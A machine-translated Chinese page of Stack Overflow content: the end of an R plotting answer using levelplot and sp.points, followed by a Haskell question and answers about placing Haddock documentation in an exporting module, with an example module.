levelplot(r1, margin=F) +
layer(sp.points(r.mask, pch=20, cex=0.3, alpha=0.8)) 
```

这类似于 OP 正在寻找的地图。可以微调点的颜色、大小和类型等参数。?sp.points 提供了所有可用于执行此操作的参数。

# haskell - 黑线鳕对进口实体的评论

> ID：11736998
> 
> 赞同：2
> 
> 时间：2012-07-31T09:26:45.570
> 
> 标签：haskell, haddock

有没有办法将 Haddock 文档添加到导出它的模块中的实体，而不是声明它的实体？

我有一个隐藏模块，它声明了十几种类型，然后是另一个模块，它只导出最终用户应该看到的部分。将文档放在公开模块而不是隐藏模块中是合乎逻辑的。但我无法弄清楚如何做到这一点......

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-31T09:51:54.130

不，这是不可能的。函数可以有每个参数和每个类型参数的文档，如果可以的话，它会使文档不一致：

1.  在不同的位置写不同的版本
2.  让一个版本覆盖另一个
3.  在参数文档中引入不一致：如果您覆盖函数的主文档字符串怎么办；应该删除参数文档字符串吗？

以下文件：

```
module Bla
       ( -- * Fooishness

         -- | This is 'foo'. It is not 'bar'.
         foo
       , -- * Barishness

         -- | This is 'bar'. It is sometimes a little 'foo'.
         bar
       ) where

-- | The actual foo documentation
foo :: a -- ^ The a
    -> b -- ^ The b
    -> c
foo = undefined

-- | The actual bar documentation
bar :: a
bar = undefined 
```

...产生此文档：

![黑线鳕文档](../Images/0754a4cc5452b187dd3ef439773b6c9c.png)

如您所见，您可以使用部分注释来模拟函数文档字符串，但只有在类型签名旁边使用函数文档注释时，才能正确生成文档。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T09:57:07.607

好吧，想想看，我可以`newtype`在暴露的模块中写一个。它没有运行时开销，它只是让我的代码更加混乱......